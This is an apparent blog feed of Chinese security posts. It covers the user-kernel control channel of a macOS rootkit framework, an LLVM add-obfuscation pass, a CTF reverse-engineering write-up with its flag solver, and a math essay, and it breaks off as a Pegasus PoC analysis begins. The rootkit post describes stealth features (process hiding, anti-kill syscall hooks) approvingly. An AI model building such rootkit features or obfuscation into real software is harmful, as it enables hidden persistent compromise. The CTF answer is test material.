    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><pre><code>#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d){    printf(&quot;hello kext!\n&quot;);    return KERN_SUCCESS;}kern_return_t TestExtension_stop(kmod_info_t *ki, void *d){    printf(&quot;bye kext!\n&quot;);    return KERN_SUCCESS;}</code></pre><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><pre><code>#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data){    int err ;    struct kern_ctl_reg ctlreg ;    bzero(&amp;ctlreg, sizeof(ctlreg)) ;    //控制信息    ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */    ctlreg.ctl_unit = 0 ;    strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));    //回调函数    ctlreg.ctl_connect_func = connect ;    ctlreg.ctl_disconnect_func = disconnect ;    ctlreg.ctl_send_func = send ;    ctlreg.ctl_getopt_func = getopt ;    ctlreg.ctl_setopt_func = setopt ;    //注册内核控制    err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;    if (err) return KERN_FAILURE ;    return KERN_SUCCESS ;}</code></pre><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><pre><code>struct kern_ctl_reg{    /* 控制信息 */    char        ctl_name[MAX_KCTL_NAME];    u_int32_t    ctl_id;    u_int32_t    ctl_unit;    /* 控制设置 */    u_int32_t    ctl_flags;    u_int32_t    ctl_sendsize;    u_int32_t    ctl_recvsize;    /* 回调函数 */    ctl_connect_func    ctl_connect;//建立连接时调用    ctl_disconnect_func    ctl_disconnect;//断开连接时调用    ctl_send_func    ctl_send;//处理从client到kernel的数据发送    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用};</code></pre><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><pre><code>#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name){    int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;    if (g_sock == 0) return 0 ;    u_int32_t id = getctlidbyname(g_sock, name) ;    sockaddr_ctl addr ;    addr.sc_len = sizeof(addr) ;    addr.sc_family = AF_SYSTEM ;    addr.sc_sysaddr = AF_SYS_CONTROL ;    addr.sc_id = id ;    addr.sc_unit = 0 ; /* allocate dynamically */    int err ;    err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;    if (err) return 0 ;    return sock ;}u_int32_t getctlidbybame(int sock, char *name){    struct ctl_info info ;    memset(&amp;info, 0, sizeof(info)) ;    strncpy(info.ctl_name, name, strlen(name)) ;    int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;    if (err) return 0 ; /* should do something stronger here! */    return info.ctl_id ;}int main(int argc, const char *argv[]){        socket_ctl(name);}//发送数据void execute_cmd(int cmd, char *args){    char data[32] = { 0 };    size_t data_len = 0;    int retv;    if(args != NULL) {        memcpy(data, args, strlen(args));    }    data_len = strlen(data) + 1;    retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);    if(retv != 0) {        printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);        printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);        return;    }}//接收数据void get_data(){    char *data = malloc(32);    socklen_t data_len = 32;    int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);    if(retv != 0) {        printf(&quot;[ERROR] getsockopt()\n&quot;);        return;    }    size_t r = recv(g_socket, data, data_len, 0);    if(r == 0) {        printf(&quot;[ERROR] recv()\n&quot;);        return;    }}</code></pre><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2019-02-21T09:55:50.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><pre><code>$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm</code></pre><p>我们选择clang作为LLVM前端，然后下载clang  </p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang</code></pre><p>下载编译运行库</p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt</code></pre><p>最后编译LLVM源码</p><pre><code>$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make</code></pre><p>编译时间可能有点长，编译完成之后进行安装</p><pre><code>$sudo make install</code></pre><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><pre><code>#include &lt;stdio.h&gt;int main(){    printf(&quot;hello LLVM\n&quot;);    return 0;}</code></pre><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><pre><code>#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;using namespace llvm;namespace {  struct SkeletonPass : public FunctionPass {    static char ID;    SkeletonPass() : FunctionPass(ID) {}    // virtual bool runOnFunction(Function &amp;F) {    //   errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;    //   return false;    // }    bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }        // a+b === a-(-b)        bool ob_add(BinaryOperator *bo) {            BinaryOperator *op = NULL;            if (bo-&gt;getOpcode() == Instruction::Add) {                // 生成 (－b)                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);                // 生成 a-(-b)                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());            }            // 替换所有出现该指令的地方            bo-&gt;replaceAllUsesWith(op);        }  };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSkeletonPass(const PassManagerBuilder &amp;,                         legacy::PassManagerBase &amp;PM) {  PM.add(new SkeletonPass());}static RegisterStandardPasses  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,                 registerSkeletonPass);</code></pre><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><pre><code>bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }</code></pre><p>代码很简单，这里就不多说。我们使用</p><pre><code>$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c</code></pre><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><pre><code>#include &lt;stdio.h&gt;int func(int a,int b){    return a + b;}int main(){    int c;    c = func(6,9);    printf(&quot;%d\n&quot;,c);    return c;}</code></pre><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/LLVM/"/>
    
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2019-02-21T10:03:11.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;elf.h&gt;#define ENTRY 0x08048320#define FILE_OFF 0x320#define COUNT 0x432int main(int argc,char *argv[]){    Elf32_Ehdr ehdr;    unsigned char buf[COUNT] = {0};    assert(argc == 2);    int fd = open(argv[1],O_RDWR);//打开文件    assert(fd&gt;0);    assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头    assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));     ehdr.e_entry = ENTRY;//修改入口地址      assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头    assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));      //解密    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码    assert(read(fd,buf,COUNT) == COUNT);    int i = 0;    while(i&lt;COUNT){        buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3;         i++;         }    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码    assert(write(fd,buf,COUNT) == COUNT);</code></pre><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-from __future__ import print_function  import sysdef getflag():    print(&quot;[i]start to encrypt key&quot;)    key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d]    encryptKey = []    print(&quot;encryptKey=[&quot;, end=&quot;&quot;)    for idx in range(len(key)):        encryptKey.append(key[idx] ^ 0x20)        print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;)    print(&quot;]&quot;)      flag = []    print(&quot;[i]find the flag&quot;)    for i in range(len(encryptKey)):        count = 0x00        while(count &lt;= 0x7f):            one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))            two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)))            if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]):                flag.append(count)                break            count = count + 1    print(&quot;flag = &quot;,end=&quot;&quot;)    for i in range(len(flag)):        print(&quot;%c&quot; % flag[i], end=&quot;&quot;)   if __name__ == &#39;__main__&#39;:    key = getflag()</code></pre><p>最后运行程序得到flag</p><pre><code>[i]start to encrypt keyencryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ][i]find the flagflag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>一道高中数学题的思考？</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/</id>
    <published>2017-05-04T12:37:59.000Z</published>
    <updated>2019-02-21T10:01:58.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 突然在邮件中收到Quora中这样一个问题”What does X equal in $\sqrt{x+15} + \sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。</p></blockquote><h2 id="0x01-你会怎么解决？"><a href="#0x01-你会怎么解决？" class="headerlink" title="0x01 你会怎么解决？"></a>0x01 你会怎么解决？</h2><p>不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。</p><h2 id="0x02-方法1-平方法"><a href="#0x02-方法1-平方法" class="headerlink" title="0x02 方法1 平方法"></a>0x02 方法1 平方法</h2><p>通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根</p><p>$\sqrt{x+15} + \sqrt{x} = 15$ </p><p>$(\sqrt{x+15} + \sqrt{x})^2 = 15^2$ </p><p>$x+15 + 2\sqrt{(x+15)x} + x = 225$ </p><p>$2\sqrt{(x+15)x} = 210 - 2x$  </p><p>$\sqrt{(x+15)x} = 105 - x$  </p><p>$(\sqrt{(x+15)x})^2 = (105 - x)^2$  </p><p>$x^2 + 15x = 11025 - 210x +x^2$  </p><p>$225x = 11025$  </p><p>$ x = 49$<br>思维过程很清楚，但明显计算上有点繁琐。  </p><h2 id="0x03-方法2-拼凑法"><a href="#0x03-方法2-拼凑法" class="headerlink" title="0x03 方法2 拼凑法"></a>0x03 方法2 拼凑法</h2><p>不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$）</p><p>哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。  </p><p>$\sqrt{49 + 15} + \sqrt{49} = 15$  </p><p>$7 + 8 = 15$<br>最快，但不一定可靠。</p><h2 id="0x04-方法3-平方差法"><a href="#0x04-方法3-平方差法" class="headerlink" title="0x04 方法3 平方差法"></a>0x04 方法3 平方差法</h2><p>暂且称作平方差法吧，这个方法是我最推荐的，既快又准。<br>原式：$\sqrt{x+15} + \sqrt{x} = 15$  (1)</p><p>设 $\sqrt{x+15} - \sqrt{x} = k$  </p><p>又 $(\sqrt{x+15} - \sqrt{x})(\sqrt{x+15} + \sqrt{x})= 15k$ </p><p>解得： $k = 1$    </p><p>所以 $\sqrt{x+15} - \sqrt{x} = 1$ （2）</p><p>然后<code>（1）+ (2)</code>:   $2\sqrt{x+15} = 16$  </p><p>解得: $x = 49$  </p><p>多么棒的一个方法 I love it！  </p><h2 id="0x05-我与数学"><a href="#0x05-我与数学" class="headerlink" title="0x05 我与数学"></a>0x05 我与数学</h2><p>从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步<a href="https://www.zhihu.com/question/30050677" target="_blank" rel="external">高考数学数列放缩总结技巧有哪些？</a><br>相信不管是现在还是将来，数学都是我最深处的支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 突然在邮件中收到Quora中这样一个问题”What do
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="math" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"/>
    
  </entry>
  
  <entry>
    <title>Pegasus内核漏洞及PoC分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/</id>
    <published>2017-05-01T06:52:45.000Z</published>
    <updated>2019-02-21T10:03:02.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X<br> 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google<br> 1.<a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a><br> 2.<a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC</a><br> 3.<a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析</a></p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 